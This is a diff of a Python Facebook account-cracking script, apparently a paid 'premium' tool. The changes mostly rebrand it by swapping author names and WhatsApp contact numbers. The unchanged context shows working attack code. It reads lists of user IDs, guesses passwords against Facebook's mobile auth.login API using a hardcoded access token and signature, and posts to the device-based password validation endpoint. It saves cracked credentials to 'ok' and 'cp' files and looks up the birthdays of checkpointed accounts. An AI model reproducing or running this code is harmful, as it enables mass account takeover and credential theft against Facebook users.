@@ -116,7 +116,7 @@ def reg():
     print (' Checking Approval')
     time.sleep(1) 
     try:
-        to = open('/sdcard/Android/.Haroon jani.txt', 'r').read()
+        to = open('/sdcard/Android/.Saadat.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
     r = requests.get('https://raw.githubusercontent.com/Haroon JaNi/Haroon JaNi/main/Haroon jaNi.txt').text
@@ -130,9 +130,9 @@ def reg():
         print ('\tApproved Not Detected')
         print ('')
         print (' \033[1;97mToken: ' + to)
-        print(' WhatsApp : +93776811468')
+        print(' WhatsApp : +93702856593')
         input('\033[1;97m Press Enter To Send Token')
-        os.system('xdg-open https://wa.me/+93776811468?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
+        os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
         reg()
 
 def reg2():
@@ -145,8 +145,8 @@ def reg2():
     print (' Token : ' + id)
     print(' WhatsApp : +93776811468')
     input(' Press Enter To Send Token ')
-    os.system('xdg-open https://wa.me/+93776811468?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
-    sav = open('/sdcard/Android/.Haroon JaNi6.txt', 'w')
+    os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
+    sav = open('/sdcard/Android/.Saadat.txt', 'w')
     sav.write(id)
     sav.close()
     reg()
@@ -171,7 +171,7 @@ def chigozie():
         print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
         print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
         input(' %s*%s tekan enter '%(O,O))
-        os.system('xdg-open https://wa.me/+923439635677')
+        os.system('xdg-open https://wa.me/+93702856593')
         bsn_menu()
     except AttributeError:
         print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
@@ -185,8 +185,8 @@ def hasil(OK,cp):
         print('\n----------------------------------------------')
         print(' Your Process Complete...')
         print('----------------------------------------------')
-        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mMudassir-ok.txt'%(O,O,str(len(ok))))
-        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mMudassir-cp.txt'%(O,O,str(len(cp))))
+        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mSaadat-ok.txt'%(O,O,str(len(ok))))
+        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mSaadat-cp.txt'%(O,O,str(len(cp))))
         print('----------------------------------------------')
         input(f"\n\033[1;97m Press Enter To Go Back ")
         bsn_menu()
@@ -197,14 +197,14 @@ def bsn_menu():
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
     print(" [*]. CREATED BY |:-( Saadat )");time.sleep (0.03)
-    print(" [*]. Tysm To My All Frendz. (Haroon JaNi)");time.sleep (0.03)
+    print(" [*]. Tysm To My All Frendz. (Saadat)");time.sleep (0.03)
     print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
     print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
     print(" [*]. WP             +93776811468      ");time.sleep (0.03)
-    print(" [*]. This Tool was made in Haroon JaNi              ");time.sleep (0.03)
+    print(" [*]. This Tool was made in Saadat              ");time.sleep (0.03)
     print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
     print(".[*] ---------------------------------------------");time.sleep(0.03)
-    print(" [*] A N O N Y M O U S  D A R K F A T E  ( Haroon JaNi )    ");time.sleep (0.03)
+    print(" [*] A N O N Y M O U S  D A R K F A T E  ( Saadat )    ");time.sleep (0.03)
     print(".[*] ---------------------------------------------");time.sleep(0.03)
     print(".[*] This is a Premium Tool Bro                                 ");time.sleep (0.03)
     print(".[*] You need to buy this tool for 1 month membership                       ");time.sleep (0.03) 
@@ -232,7 +232,7 @@ class __bsn__:
         print("              file crack menu")
         print(' -------------------------------------------')
         print('')
-        self.cnt = input('%s [+] file name :%s '%(P,K))
+        self.cnt = input('%s [+] file name :%s '%(A,F))
         self.id = open(self.cnt).read().splitlines()
         os.system('clear')
         logo()
@@ -254,7 +254,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write(f'\r [Haroon] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+            sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -262,7 +262,7 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-ADF] %s | %s ' % (user,pw))
+                print('\r [OK-Saadat] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
@@ -273,10 +273,10 @@ class __bsn__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-haroon JaNi] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('Haroon JaNi-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('Saadat-cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -284,7 +284,7 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;91m[CP-Mudassir] %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('Mudassir-cp.txt' , 'a').write('%s\n' % wrt)
@@ -295,7 +295,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r [Haroon] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -345,7 +345,7 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-Mudassir] {user} | {pw}')
+                    print(f'\r{H} [OK-Saadat] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
@@ -357,7 +357,7 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-Mudassir] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
@@ -367,7 +367,7 @@ class __bsn__:
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[CP-Mudassir] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
